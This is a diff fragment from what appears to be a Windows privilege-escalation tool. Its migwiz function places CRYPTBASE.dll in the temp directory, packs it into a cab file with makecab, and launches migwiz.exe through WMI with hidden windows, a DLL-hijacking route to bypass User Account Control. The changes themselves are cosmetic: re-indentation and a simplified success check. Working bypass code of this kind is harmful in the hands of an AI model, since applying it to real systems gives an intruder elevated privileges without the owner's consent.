@@ -58,8 +58,8 @@ def migwiz(payload):
 	print_info("Attempting to create cabinet file")
 	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll")) == True):
 		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"),
-							os.path.join(tempfile.gettempdir(),"suspicious.cab")),
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+								os.path.join(tempfile.gettempdir(),"suspicious.cab")),
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 		
 		time.sleep(5)
 
@@ -110,16 +110,12 @@ def migwiz(payload):
 	"""		
 	print_info("Attempting to run migwiz executable")
 	migwiz = wmi.Win32_Process.Create(CommandLine="cmd.exe /c {}\migwiz\migwiz.exe".format(system_directory()),
-						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 				
 	time.sleep(5)
 
 	if (migwiz[1] == 0):
-		try:
-			print_success("Successfully ran migwiz executable")
-		except Exception as error:
-			print_error("Unable to run migwiz executable")
-			return False
+		print_success("Successfully ran migwiz executable")
 	else:
 		print_error("Unable to run migwiz executable")
 		return False
